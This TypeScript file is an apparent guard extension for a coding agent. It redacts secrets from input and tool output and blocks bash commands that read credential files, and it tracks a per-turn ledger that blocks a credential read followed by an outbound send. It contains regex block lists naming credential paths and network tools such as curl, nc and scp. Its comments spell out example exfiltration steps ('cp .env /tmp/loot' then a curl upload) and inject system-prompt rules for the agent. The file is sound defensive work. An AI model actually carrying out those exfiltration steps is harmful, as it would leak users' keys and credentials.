/**
 * Secret Guard — always-on protection for secrets.
 *
 * Radar basis: #20 stateful guardrails, #22 toxic flow analysis for AI,
 * #1 agent sandboxing (Adopt).
 *
 * Layers:
 *  1. input       — redacts secret values from user input before they reach the model
 *  2. tool_call   — blocks reading secret files, commands carrying secret values,
 *                   and writing secret values into files
 *  3. tool_result — redacts secret values from tool output before the model sees it
 *  4. before_agent_start — always-on guard rules injected into the system prompt
 *  5. flow       — turn-level ledger: a secret file read and an outbound send in
 *                  one turn is a toxic flow even when each call is harmless
 *
 * Escape hatches (explicit user intent only):
 *  - /secretguard allow|block   (session-scoped, reset on session start)
 *  - env SECRET_GUARD_PASSTHROUGH=1
 *
 * Audit log: <agent-dir>/secret-guard.log  (counts and pattern names only — never values)
 */
import { appendFile } from "node:fs/promises";
import {
	type ExtensionAPI,
	getAgentDir,
	isBashToolResult,
	isToolCallEventType,
	withFileMutationQueue,
} from "@earendil-works/pi-coding-agent";

const LOG_FILE = `${getAgentDir()}/secret-guard.log`;

// ---------------------------------------------------------------------------
// High-confidence secret patterns. Detection = block; redaction = replace value.
// ---------------------------------------------------------------------------
const PATTERNS: { name: string; re: RegExp }[] = [
	{ name: "private-key", re: /-----BEGIN (RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----[\s\S]*?-----END (RSA |EC |DSA |OPENSSH |ENCRYPTED )?PRIVATE KEY-----/g },
	{ name: "aws-key", re: /\bAKIA[0-9A-Z]{16}\b/g },
	{ name: "api-key", re: /\bsk-[A-Za-z0-9_-]{20,}\b/g },
	{ name: "github-token", re: /\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{20,}\b|\bgithub_pat_[A-Za-z0-9_]{20,}\b/g },
	{ name: "slack-token", re: /\bxox[baprs]-[A-Za-z0-9-]{10,}\b/g },
	{ name: "google-key", re: /\bAIza[0-9A-Za-z_-]{35}\b/g },
	{ name: "stripe-key", re: /\b(?:sk|rk)_live_[0-9a-zA-Z]{20,}\b/g },
	{ name: "jwt", re: /\beyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\b/g },
	{ name: "db-uri", re: /\b(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis):\/\/[^\s/@:]+:[^\s/@]+@/gi },
	{ name: "secret-assignment", re: /(?:password|passwd|pwd|secret|api[_-]?key|api[_-]?secret|access[_-]?token|secret[_-]?key|client[_-]?secret|auth[_-]?token|aws[_-]?(?:access[_-]?key|secret[_-]?access[_-]?key)|db[_-]?password)\s*[=:]\s*["'][^"'\n]{6,}["']/gi },
	{ name: "secret-assignment", re: /(?:password|secret|api[_-]?key|access[_-]?token|secret[_-]?key|client[_-]?secret|auth[_-]?token|aws[_-]?(?:access[_-]?key|secret[_-]?access[_-]?key)|db[_-]?password)\s*[=:]\s*[A-Za-z0-9_\-./+]{16,}\b/gi },
];

/**
 * A credential file, by name. The `.env` branch takes a glued prefix, so
 * `prod.env` and `config/prod.env` are credential files too; the terminator
 * after the extension is what keeps the long tail out (`my.environment`,
 * `readme.envoy` and `production.pem.md` are ordinary files).
 */
const SECRET_FILE_RE =
	/(^|[\/\\'"\s])([^\/\\'"\s]*\.env(\.[a-zA-Z0-9_-]+)?|\.git-credentials|\.netrc|\.pypirc|\.npmrc|id_rsa|id_ed25519|id_dsa|id_ecdsa|credentials\.(json|ya?ml|toml)|secrets\.(json|ya?ml|toml)|kubeconfig|auth\.json)([\/\\'"\s]|$)|(^|[\/\\'"\s])[^\/\\'"\s]*\.(pem|p12|pfx|jks|keystore|key)([\/\\'"\s]|$)|(^|[\/\\'"\s])(\.aws|\.ssh|\.gnupg|\.kube)([\/\\]|$)|\.config[\/\\]gcloud/gi;

const SAFE_RE = /example|sample|template|fixture|mock|dummy|placeholder|changeme/i;

/** Assignment values that point at the environment instead of embedding a secret. */
const ENV_REF_RE = /^(?:process\.env|os\.environ|import\.meta\.env|Deno\.env|env\.|getenv\()/;

/**
 * Tools that print or transfer file content (i.e. that would leak content to
 * the model or network). A verb reached through a path is still the verb —
 * `/usr/bin/cat`, `/bin/cat` and `./rg` read exactly like `cat`, `cat` and
 * `rg` — and a backslash escape (`\cat`, the usual alias bypass) is the same
 * verb again, so a path separator separates as well as a space or a shell
 * operator.
 */
const READER_RE =
	/(^|[;&|()\s\/\\])(cat|bat|sed|head|tail|base64|xxd|od|strings|diff|expand|awk|grep|rg|scp|rsync|curl|wget)\b|git\s+(show|cat-file|checkout|diff|restore)\b/i;

/**
 * Verbs that can move file *content*, for the ledger. Wider than READER_RE:
 * `cp`, `tar` and `node` are the copy steps a flow uses to dodge a blocked read.
 * A verb-less command (`ls dir`, `git status`) can name a path without touching it.
 * The prefix widens with READER_RE, or `/usr/bin/cp config/prod.env /tmp/loot`
 * would copy a credential file and leave no trace for the send that follows.
 */
const TOUCH_RE =
	/(^|[;&|()\s\/\\])(cat|bat|sed|head|tail|base64|xxd|od|strings|diff|expand|awk|grep|rg|cp|mv|ln|tar|zip|unzip|gzip|gunzip|dd|install|tee|split|openssl|node|python3?|perl|ruby|php|jq|sort|uniq|wc|less|more|vi|vim|nano|source|sh|bash|sqlite3|xargs|find)\b|git\s+(add|show|cat-file|checkout|diff|restore|stash)\b/i;

/** A word shaped like a path (`$HOME/.ssh/id_rsa`, `".env"`, `certs/x.pem`) rather than prose. */
const PATH_SHAPED_RE = /[\/~]|^\.|^\$/;

/**
 * The operators that start a new command. A separator inside a quoted word is
 * part of that word: a commit message with a newline in it is one argument, not
 * a command on line two.
 */
const SEGMENT_SEPARATORS = ";&|()\n";

/**
 * Split a command at the shell operators that start a new command, respecting
 * quotes. Each segment is judged on its own: what matters is the verb a path is
 * an argument of, not whether the character appears somewhere in the command.
 */
function commandSegments(command: string): string[] {
	const segments: string[] = [];
	let current = "";
	let quote: string | null = null;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote) {
			current += ch;
			if (ch === quote && command[i - 1] !== "\\") quote = null;
			continue;
		}
		if (ch === '"' || ch === "'") {
			quote = ch;
			current += ch;
			continue;
		}
		if (SEGMENT_SEPARATORS.includes(ch)) {
			segments.push(current);
			current = "";
			continue;
		}
		current += ch;
	}
	segments.push(current);
	return segments;
}

/** The heredoc delimiters opened on one line (`<<EOF`, `<<-'SH'`), quotes respected. */
function heredocDelimiters(line: string): string[] {
	const found: string[] = [];
	let quote: string | null = null;
	for (let i = 0; i < line.length; i++) {
		const ch = line[i];
		if (quote) {
			if (ch === quote && line[i - 1] !== "\\") quote = null;
			continue;
		}
		if (ch === '"' || ch === "'") {
			quote = ch;
			continue;
		}
		if (ch !== "<" || line[i + 1] !== "<") continue;
		const m = /^<<-?\s*(["']?)([A-Za-z0-9_.:-]+)\1/.exec(line.slice(i));
		if (!m) continue;
		found.push(m[2]);
		i += m[0].length - 1;
	}
	return found;
}

/**
 * Drop heredoc bodies. A body is text handed to a program, not a command line:
 * prose in a `git commit -F - <<'MSG'` message names files without opening one.
 * A body whose bytes land in a credential file still writes it, and that target
 * stays on the header line (`cat > config/prod.env <<'EOF'`), where the read
 * check sees it.
 */
function stripHeredocs(command: string): string {
	const lines = command.split("\n");
	const kept: string[] = [];
	for (let i = 0; i < lines.length; i++) {
		kept.push(lines[i]);
		for (const delim of heredocDelimiters(lines[i])) {
			while (++i < lines.length && lines[i].trim() !== delim) continue;
		}
	}
	return kept.join("\n");
}

/** The command text with comments and heredoc bodies gone: command lines only. */
function commandLines(command: string): string[] {
	return commandSegments(stripHeredocs(stripComments(command)));
}

/**
 * Words that hand the command position on: `sudo cat .env` reads the file, and
 * `FOO=1 cat .env` still runs `cat`.
 */
const WRAPPER_RE = /^(?:sudo|doas|time|command|env|exec|nohup|nice|builtin|xargs|stdbuf|busybox)$/;

/** A shell that runs its `-c` argument as a command: `sh -c 'cat .env'` reads. */
const SHELL_RE = /(^|\/)(?:ba|da|k|z)?sh$/;

/** The verb of a segment: wrappers and `NAME=value` skipped, a `git` subcommand folded in. */
function segmentVerb(words: { text: string; quoted: boolean }[]): { verb: string; at: number } | null {
	for (let i = 0; i < words.length; i++) {
		const text = words[i].text;
		if (text === "") continue;
		if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(text)) continue;
		if (WRAPPER_RE.test(text)) continue;
		if (text === "timeout") {
			i++; // the duration, not the verb
			continue;
		}
		if (/^[0-9]*[<>]/.test(text)) continue; // a redirect, not a verb
		if (/(^|\/)git$/.test(text)) return { verb: `git ${words[i + 1]?.text ?? ""}`.trim(), at: i + 1 };
		return { verb: text, at: i };
	}
	return null;
}

/** The script a shell was handed with `-c`, if any. */
function shellScript(words: { text: string }[], at: number): string | null {
	for (let i = at + 1; i < words.length - 1; i++) {
		if (/^-[a-z]*c$/.test(words[i].text)) return words[i + 1].text;
	}
	return null;
}

/** A reader that takes a pattern or a script before the files it reads. */
const PATTERN_VERB_RE = /(^|\/)(?:grep|egrep|fgrep|rg|sed|awk)$/;

/** A sed/awk program rather than a file name: `s/a/b/g`, `1,70p`, `/re/p`, `{print $1}`. */
function isProgram(text: string): boolean {
	return (
		/^[syd]([^\w\s]).*?\1[a-z]*(\s*;.*)?$/s.test(text) ||
		/^[/{].*[/}]$/.test(text) ||
		/^[0-9,$]+[a-zA-Z]{0,2}$/.test(text)
	);
}

/**
 * The words of a segment that are a program rather than a file.
 * `sed -E 's/process\.env\.//'` names no file, so nothing is opened; a bare
 * file name handed to the same verb does name one, and stays gated.
 */
function scriptIndices(words: { text: string }[], verb: string, at: number): Set<number> {
	const skip = new Set<number>();
	if (!PATTERN_VERB_RE.test(verb)) return skip;
	let seen = false;
	for (let i = at + 1; i < words.length; i++) {
		const text = words[i].text;
		if (text === "-e") {
			skip.add(++i); // the script itself
			seen = true;
			continue;
		}
		if (text === "-f") {
			i++; // a pattern file: a real read, keep checking it
			seen = true;
			continue;
		}
		if (text.startsWith("-") || seen) continue;
		seen = true;
		if (isProgram(text)) skip.add(i);
	}
	return skip;
}

/**
 * True when a word names a credential file in argument position: unquoted words
 * are always arguments, a quoted word only when it is shaped like a path rather
 * than prose (`".env"` is an argument, `"no .env here"` is a sentence).
 */
function secretPathWord(word: { text: string; quoted: boolean }): boolean {
	if (!hasMatch(SECRET_FILE_RE, word.text) || hasMatch(SAFE_RE, word.text)) return false;
	return !word.quoted || PATH_SHAPED_RE.test(word.text);
}

/**
 * Verbs that hand bytes to another machine. A verb reached through a path is
 * still the verb — `/usr/bin/curl` and `./rsync` reach the network exactly like
 * `curl` and `rsync` — so a path slash separates as well as a space or a shell
 * operator. `http`/`https` stay because they cover a command aimed at another
 * machine whose verb is not one we know; they are not a verb shape, so they do
 * not stand in for the widened prefix.
 */
const SEND_RE =
	/(^|[;&|()\s\/\\])(curl|wget|scp|rsync|http|https|nc|netcat|ncat)\b|(^|[;&|()\s\/\\])git\s+push\b/i;

/** An operand that names another host: a URL, `user@host:path`, or a dotted hostname. */
const NET_TARGET_RE = /[a-z][a-z0-9+.-]*:\/\/|@[a-z0-9._-]+:|(^|\s)[a-z0-9_-]+(\.[a-z0-9_-]+)+([:\/\s]|$)/i;

/** Flags whose value is a file that goes out as the request body. */
const UPLOAD_FLAG_RE = /(^|\s)(-T|--upload-file|--post-file|--body-file)(\s+|=)\S/;

/** `$(cat f)`, `` `base64 f` `` — the body is read from a local file. */
const CONTENT_FROM_FILE_RE =
	/(\$\(|`)[^)`]*\b(cat|base64|xxd|od|strings|head|tail|sed|awk|grep|rg|env|printenv|openssl)\b/;

/** `host:path` (rsync/scp remote spec). `://` is excluded so a URL is not read as one. */
const REMOTE_SPEC_RE = /^(?:[a-z0-9_.-]+@)?[a-z0-9.-]+:(?!\/\/)/i;

let passthrough = process.env.SECRET_GUARD_PASSTHROUGH === "1";

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------
function hasMatch(re: RegExp, s: string): boolean {
	re.lastIndex = 0;
	const m = re.exec(s);
	re.lastIndex = 0;
	return !!m;
}

function redactText(input: string): { text: string; count: number } {
	let text = input;
	let count = 0;
	for (const p of PATTERNS) {
		text = text.replace(p.re, (m) => {
			if (hasMatch(SAFE_RE, m)) return m;
			count++;
			return `[REDACTED:${p.name}]`;
		});
	}
	return { text, count };
}

function isSecretPath(path: string): boolean {
	return hasMatch(SECRET_FILE_RE, path) && !hasMatch(SAFE_RE, path);
}

/** Shell-ish word split, tracking which words were quoted. */
function shellWords(command: string): { text: string; quoted: boolean }[] {
	const words: { text: string; quoted: boolean }[] = [];
	const re = /"((?:[^"\\]|\\.)*)"|'([^']*)'|(\S+)/g;
	let m: RegExpExecArray | null;
	while ((m = re.exec(command)) !== null) {
		if (m[0] === "") {
			re.lastIndex += 1;
			continue;
		}
		const text = m[1] ?? m[2] ?? m[3] ?? "";
		words.push({ text, quoted: m[1] !== undefined || m[2] !== undefined });
	}
	return words;
}

/**
 * True when the command hands a secret file to a reader or transfer tool.
 *
 * A secret path only counts as an argument. Mentioning a name inside quoted
 * code (a grep of a script, an inline `node -e`) must not trip the guard, while
 * `cat .env` or `cat "$HOME/.ssh/id_rsa"` still must.
 */
function leaksSecretFile(command: string): boolean {
	for (const line of commandLines(command)) {
		const words = shellWords(line);
		// A redirect target is written, not read, and a credential file written by
		// the shell is the same leak as one read: `cat > config/prod.env <<'EOF'`.
		for (let i = 1; i < words.length; i++) {
			if (/^>>?$/.test(words[i - 1].text) && secretPathWord(words[i])) return true;
		}
		const cmd = segmentVerb(words);
		if (!cmd) continue;
		const scripts = scriptIndices(words, cmd.verb, cmd.at);
		if (hasMatch(READER_RE, cmd.verb) && words.some((word, i) => !scripts.has(i) && secretPathWord(word))) return true;
		if (SHELL_RE.test(cmd.verb)) {
			const script = shellScript(words, cmd.at);
			if (script !== null && script !== line && leaksSecretFile(script)) return true;
		}
	}
	return false;
}

/**
 * The candidate value of an assignment match: the text after `=` / `:`, unquoted.
 * Keeps a placeholder key name (`mock_api_key`) from whitelisting a real value.
 */
function assignmentValue(match: string): string {
	const m = /^\s*[^=:]*[=:]\s*["']?([\s\S]*?)["']?\s*$/.exec(match);
	return m?.[1] ?? match;
}

function findSecretValue(input: string, patterns = PATTERNS): string | null {
	for (const p of patterns) {
		p.re.lastIndex = 0;
		let m: RegExpExecArray | null;
		while ((m = p.re.exec(input)) !== null) {
			if (m[0] === "") {
				p.re.lastIndex += 1;
				continue;
			}
			// Judge the match itself, never the surrounding text: a key sent to
			// evil.test must not pass because the command mentions "example", and a
			// placeholder *value* keeps its assignment writable.
			const candidate = p.name === "secret-assignment" ? assignmentValue(m[0]) : m[0];
			if (!hasMatch(SAFE_RE, candidate) && !hasMatch(ENV_REF_RE, candidate)) {
				p.re.lastIndex = 0;
				return p.name;
			}
		}
		p.re.lastIndex = 0;
	}
	return null;
}

// ---------------------------------------------------------------------------
// Turn-level flow ledger (blips 20 + 22).
//
// Every layer above judges one tool call, and each step of a toxic flow is
// harmless alone: `cp .env /tmp/loot` (a copy, not a read), `x=$(base64
// /tmp/loot)` (a temp file), `curl --data-binary @/tmp/loot https://host`
// (a POST). Nothing is a secret value, nothing names a secret file at the
// moment it leaves. So the guard keeps a small ledger for the turn: which
// secret-shaped paths a step touched and which step touched them (step number,
// tool, command). A later step in the same turn that sends file content off the
// machine is refused, and the earlier step is named in the refusal.
//
// A "turn" here is one agent run (one user prompt), not one model response:
// pi fires `turn_start` per response, and the flow above spans several of them.
// The ledger resets at `input`, `agent_start` and `session_start`, so two
// unrelated turns never share one.
// ---------------------------------------------------------------------------
const LEDGER_LIMIT = 16;
const EXCERPT_MAX = 72;

type Touch = { step: number; tool: string; path: string; command: string };

let stepSeq = 0;
let touches: Touch[] = [];

function resetFlow(): void {
	stepSeq = 0;
	touches = [];
}

function recordTouch(step: number, tool: string, path: string, command: string): void {
	if (touches.some((t) => t.path === path)) return;
	touches.push({ step, tool, path, command });
	if (touches.length > LEDGER_LIMIT) touches.shift();
}

/** One line naming an earlier step, safe to show the model (values redacted, command shortened). */
function describeTouch(t: Touch): string {
	const cmd = redactText(t.command).text.replace(/\s+/g, " ").trim();
	const excerpt = cmd.length > EXCERPT_MAX ? `${cmd.slice(0, EXCERPT_MAX)}…` : cmd;
	return `step ${t.step} (${t.tool} \`${excerpt}\`) touched ${t.path}`;
}

/** Drop `#` comments (outside quotes) so a path in prose is not a touch. */
function stripComments(command: string): string {
	let out = "";
	let quote: string | null = null;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote) {
			out += ch;
			if (ch === quote && command[i - 1] !== "\\") quote = null;
			continue;
		}
		if (ch === '"' || ch === "'") {
			quote = ch;
			out += ch;
			continue;
		}
		if (ch === "#" && (i === 0 || /\s/.test(command[i - 1] ?? ""))) {
			while (i < command.length && command[i] !== "\n") i++;
			out += "\n";
			continue;
		}
		out += ch;
	}
	return out;
}

/**
 * Secret-shaped paths the command touches as a shell argument.
 *
 * Three things keep a mention out of the ledger: a `#` comment, a bare name in
 * prose, and a command with no content-moving verb (a quoted commit message is
 * the common case). A blocked read never reaches here: it cannot have run.
 */
function secretPathsTouched(command: string): string[] {
	const paths: string[] = [];
	for (const line of commandLines(command)) {
		const words = shellWords(line);
		const cmd = segmentVerb(words);
		if (!cmd || !hasMatch(TOUCH_RE, cmd.verb)) continue;
		const scripts = scriptIndices(words, cmd.verb, cmd.at);
		for (const [i, word] of words.entries()) {
			if (scripts.has(i) || !secretPathWord(word)) continue;
			if (!paths.includes(word.text)) paths.push(word.text);
		}
	}
	return paths;
}

/** scp/rsync upload the local operands that come before a remote one. */
function lastOperandIsRemote(command: string): boolean {
	const operands = shellWords(stripComments(command))
		.map((w) => w.text)
		.filter((t) => t !== "" && !t.startsWith("-"));
	const last = operands[operands.length - 1];
	return !!last && hasMatch(REMOTE_SPEC_RE, last);
}

/** True when the command hands file content to another machine. */
function sendsFileContent(command: string): boolean {
	const cmd = stripComments(command);
	// `git push` ships commits, and commits carry files.
	if (/(^|[;&|()\s\/\\])git\s+push\b/i.test(cmd)) return true;
	// An upload flag, or an `@file` body (`-d @f`, `--data-binary @f`, `-F f=@p`).
	if (UPLOAD_FLAG_RE.test(cmd)) return true;
	for (const word of shellWords(cmd)) {
		const m = /^(?:--?[\w-]+=?|[\w.-]+=)?@(.+)$/.exec(word.text);
		if (m && m[1] !== "-") return true;
	}
	// A body read from a local file: `$(cat f)`, `` `base64 f` ``.
	if (CONTENT_FROM_FILE_RE.test(cmd)) return true;
	// A body piped in from a reader: `cat loot | curl -d @- https://host`.
	const pipe = cmd.split("|");
	if (pipe.length > 1 && hasMatch(READER_RE, pipe.slice(0, -1).join("|"))) return true;
	// A body redirected in from a real file: `curl -d @- < loot`.
	const redirect = /<\s*([^\s<&()]+)/.exec(cmd);
	if (redirect && redirect[1] !== "/dev/null") return true;
	// scp/rsync whose last operand is the other machine.
	if (/(^|[;&|()\s\/\\])(scp|rsync)\b/i.test(cmd)) return lastOperandIsRemote(cmd);
	return false;
}

/** True when the command aims bytes at another machine at all. */
function isOutboundSend(command: string): boolean {
	const cmd = stripComments(command);
	if (!hasMatch(SEND_RE, cmd)) return false;
	if (/(^|[;&|()\s\/\\])git\s+push\b/i.test(cmd)) return true;
	if (/(^|[;&|()\s\/\\])(scp|rsync)\b/i.test(cmd)) return lastOperandIsRemote(cmd);
	return hasMatch(NET_TARGET_RE, cmd);
}

async function log(line: string) {
	try {
		await withFileMutationQueue(LOG_FILE, async () => {
			await appendFile(LOG_FILE, `[${new Date().toISOString()}] ${line}\n`);
		});
	} catch {
		/* logging must never break anything */
	}
}

const GUARD_RULES = `# Secret Guard (always active)

- Never read, print, transmit, or echo secret values or secret files (.env*, *.pem/*.key, credentials/secrets files, auth.json, ~/.aws, ~/.ssh, ~/.gnupg, ~/.kube, .npmrc, .netrc). The extension blocks most of this mechanically; do not try to bypass blocks.
- Never hardcode secrets in code or configs. Use environment variables, .env with a committed .env.example, or a secret manager.
- Never put secrets in git: not in files, diffs, or commit messages. If a secret was ever committed or shared, tell the user to rotate it immediately.
- If the user pastes a secret, warn and advise rotation; never repeat it. Only use it with explicit user intent after warning (/secretguard allow).
- Never send secrets over the network (curl, scp, rsync, etc.) or into URLs, logs, or pastebins.`;

// ---------------------------------------------------------------------------
// extension
// ---------------------------------------------------------------------------
export default function secretGuard(pi: ExtensionAPI) {
	pi.on("session_start", () => {
		passthrough = false;
		resetFlow();
	});

	// A new run (one user prompt) is a new turn: the flow ledger starts empty.
	pi.on("agent_start", () => {
		resetFlow();
	});

	// 1) Redact secrets from user input before the model sees it.
	pi.on("input", async (event, ctx) => {
		if (event.source !== "extension") resetFlow();
		if (event.source === "extension" || passthrough) return { action: "continue" };
		const { text, count } = redactText(event.text);
		if (count > 0) {
			await log(`input: redacted ${count} secret(s)`);
			ctx.ui.notify(
				`secret-guard: redacted ${count} secret(s) from your input — they never reached the model. Use /secretguard allow if you intentionally need a secret processed (not recommended).`,
				"warning",
			);
			return { action: "transform", text };
		}
		return { action: "continue" };
	});

	// 2) Block dangerous tool calls.
	pi.on("tool_call", async (event, ctx) => {
		if (passthrough) return;
		const step = ++stepSeq;

		if (isToolCallEventType("bash", event)) {
			const cmd = event.input.command;

			// a) command carries a secret value
			const value = findSecretValue(cmd);
			if (value) {
				await log(`tool_call bash: blocked command containing ${value}`);
				ctx.ui.notify(`secret-guard: blocked a command containing a ${value}`, "warning");
				return { block: true, reason: `secret-guard: blocked — command contains a likely ${value}. Use /secretguard allow if intentional.` };
			}

			// b) command reads/transfers a secret file
			if (leaksSecretFile(cmd)) {
				await log("tool_call bash: blocked read of secret file");
				ctx.ui.notify("secret-guard: blocked a command reading a secret file", "warning");
				return { block: true, reason: "secret-guard: blocked — command reads a secret file (.env, key, credentials, …). Use /secretguard allow if intentional." };
			}

			// c) an earlier step in this turn touched a secret file and this one sends
			//    file content off the machine — the flow, not the call, is the leak
			const earlier = touches[touches.length - 1];
			if (earlier && isOutboundSend(cmd) && sendsFileContent(cmd)) {
				const more = touches.length > 1 ? ` (and ${touches.length - 1} earlier secret-file step(s) this turn)` : "";
				await log(`tool_call bash: blocked turn-level leak — ${earlier.path} read at step ${earlier.step}, send at step ${step}`);
				ctx.ui.notify(`secret-guard: blocked a send — an earlier step this turn touched ${earlier.path}`, "warning");
				return {
					block: true,
					reason: `secret-guard: blocked — this command sends file content off the machine, and ${describeTouch(earlier)}${more}. A secret read and an outbound send in one turn is the leak. Use /secretguard allow if intentional.`,
				};
			}

			// Not blocked: remember every secret-shaped path this step touched.
			for (const path of secretPathsTouched(cmd)) recordTouch(step, "bash", path, cmd);
		}

		if (isToolCallEventType("read", event)) {
			if (isSecretPath(event.input.path)) {
				await log(`tool_call read: blocked secret file ${event.input.path}`);
				ctx.ui.notify(`secret-guard: blocked reading secret file "${event.input.path}"`, "warning");
				return { block: true, reason: `secret-guard: blocked reading "${event.input.path}" — secret files must not reach the model. Use /secretguard allow if intentional.` };
			}
		}

		if (isToolCallEventType("write", event) || isToolCallEventType("edit", event)) {
			if (isSecretPath(event.input.path)) {
				await log(`tool_call ${event.toolName}: blocked write to secret file ${event.input.path}`);
				return { block: true, reason: `secret-guard: blocked writing to "${event.input.path}" — secret files stay out of the working tree. Use /secretguard allow if intentional.` };
			}
			const texts: string[] = [];
			if (isToolCallEventType("write", event)) texts.push(event.input.content ?? "");
			else if (isToolCallEventType("edit", event)) for (const e of event.input.edits ?? []) texts.push(e.oldText ?? "", e.newText ?? "");
			const value = texts.map((t) => findSecretValue(t)).find((v) => v !== null);
			if (value) {
				await log(`tool_call ${event.toolName}: blocked writing ${value} into file`);
				return { block: true, reason: `secret-guard: blocked — the file content contains a likely ${value}. Use env vars or placeholders instead. Use /secretguard allow if intentional.` };
			}
		}
	});

	// 3) Redact secrets from tool output before the model sees it.
	pi.on("tool_result", async (event) => {
		if (passthrough) return;
		let changed = false;
		let content = event.content;
		if (Array.isArray(content)) {
			content = content.map((part) => {
				if (part && part.type === "text") {
					const r = redactText(part.text);
					if (r.count > 0) {
						changed = true;
						return { ...part, text: r.text };
					}
				}
				return part;
			});
		}
		let details = event.details;
		if (isBashToolResult(event) && details) {
			const d = details as { stdout?: string; stderr?: string } & object;
			let stdout = d.stdout;
			let stderr = d.stderr;
			if (typeof stdout === "string") {
				const r = redactText(stdout);
				if (r.count > 0) {
					stdout = r.text;
					changed = true;
				}
			}
			if (typeof stderr === "string") {
				const r = redactText(stderr);
				if (r.count > 0) {
					stderr = r.text;
					changed = true;
				}
			}
			if (changed) details = { ...d, stdout, stderr };
		}
		if (changed) {
			await log(`tool_result ${event.toolName}: redacted output`);
			return { content, details };
		}
	});

	// 4) Always-on guard rules in the system prompt.
	pi.on("before_agent_start", async (event) => ({
		systemPrompt: `${event.systemPrompt}\n\n${GUARD_RULES}`,
	}));

	// User runs bash directly (! command).
	pi.on("user_bash", async (event, ctx) => {
		if (passthrough) return;
		if (leaksSecretFile(event.command)) {
			await log("user_bash: blocked read of secret file");
			ctx.ui.notify("secret-guard: blocked your command — it reads a secret file", "warning");
			return { result: { output: "secret-guard: blocked — command reads a secret file.", exitCode: 1, cancelled: true, truncated: false } };
		}
	});

	// Control command.
	pi.registerCommand("secretguard", {
		description: "Secret guard: status | allow | block",
		handler: async (args, ctx) => {
			const a = (args ?? "").trim().toLowerCase();
			if (a === "allow") {
				passthrough = true;
				// A read the user just allowed must not be held against a later send.
				resetFlow();
				await log("command: passthrough ON");
				ctx.ui.notify("secret-guard: passthrough ON — secrets will be processed this session. Turn off with /secretguard block.", "warning");
			} else if (a === "block") {
				passthrough = false;
				await log("command: passthrough OFF");
				ctx.ui.notify("secret-guard: passthrough OFF — protection active.", "info");
			} else {
				ctx.ui.notify(`secret-guard: protection ${passthrough ? "OFF (passthrough)" : "ACTIVE"}`, passthrough ? "warning" : "info");
			}
		},
	});
}
